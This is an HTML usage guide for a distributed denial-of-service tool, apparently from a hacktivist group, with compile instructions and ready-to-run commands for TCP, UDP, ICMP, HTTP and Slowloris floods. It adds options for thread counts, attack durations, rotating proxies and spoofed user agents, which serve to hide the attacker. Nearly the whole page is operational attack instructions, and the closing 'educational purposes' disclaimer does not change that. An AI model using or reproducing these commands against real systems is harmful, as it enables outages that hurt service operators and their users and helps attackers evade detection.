<!DOCTYPE html>
<html>
<body>
  <h1>Anonymous Vibes Bangladesh DDoS Tool</h1>
  
  <h2>Compilation Instructions (Optional)</h2>
  <pre><code>g++ -o avb-ddos avb-ddos.cpp -lcurl -lpthread</code></pre>

  <h2>Basic Usage Syntax</h2>
  <pre><code>./avb-ddos --target &lt;IP&gt; --port &lt;PORT&gt; --&lt;ATTACK_MODE&gt; [OPTIONS]</code></pre>

  <h2>Attack Modes</h2>
  
  <h3>1. TCP Flood Attack</h3>
  <pre><code>./avb-ddos -t 192.168.1.100 -p 80 --tcp --threads 1000</code></pre>
  <p>Flood TCP port 80 with 1000 concurrent threads</p>

  <h3>2. UDP Flood Attack</h3>
  <pre><code>./avb-ddos --target 10.0.0.5 --port 53 --udp --duration 300</code></pre>
  <p>UDP flood on DNS port (53) for 5 minutes (300 seconds)</p>

  <h3>3. ICMP Flood (Ping Flood)</h3>
  <pre><code>sudo ./avb-ddos -t 203.0.113.25 --icmp --threads 500</code></pre>
  <p>Requires root privileges, floods target with ICMP Echo requests</p>

  <h3>4. HTTP Flood</h3>
  <pre><code>./avb-ddos --target example.com -p 443 --http --proxy proxies.txt --useragents ua.txt</code></pre>
  <p>HTTPS flood using rotating proxies and custom User-Agents</p>

  <h3>5. Slowloris Attack</h3>
  <pre><code>./avb-ddos -t 192.168.1.10 -p 8080 --slowloris --threads 200</code></pre>
  <p>Maintains multiple persistent HTTP connections</p>

  <h2>Advanced Options</h2>
  
  <h3>Using Proxies</h3>
  <pre><code>./avb-ddos -t 10.1.1.1 -p 80 --http --proxy proxies.txt</code></pre>
  <p>Proxy list format (proxies.txt):</p>
  <pre>
http://proxy1:port
socks5://proxy2:port
  </pre>

  <h3>Custom User Agents</h3>
  <pre><code>./avb-ddos --target example.com -p 80 --http --useragents user-agents.txt</code></pre>
  <p>user-agents.txt format (one per line):</p>
  <pre>
Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
Mozilla/5.0 (Linux; Android 10; SM-G980F)...
  </pre>

  <h2>Important Notes</h2>
  <ul>
    <li>🛑 <strong>Requires root privileges for ICMP attacks</strong></li>
    <li>⚠️ <strong>Default thread count: 500</strong></li>
    <li>🔌 <strong>Add --timeout to configure connection timeout (default: 10s)</strong></li>
    <li>⏱️ <strong>Use --duration for timed attacks</strong></li>
  </ul>

  <h2>Legal Disclaimer</h2>
  <p>⚠️ <em>This tool is for educational purposes and authorized testing only. 
  <br>Misuse of this software is strictly prohibited. The developers assume no liability 
  <br>for any unauthorized or illegal use of this tool.</em></p>
</body>
</html>
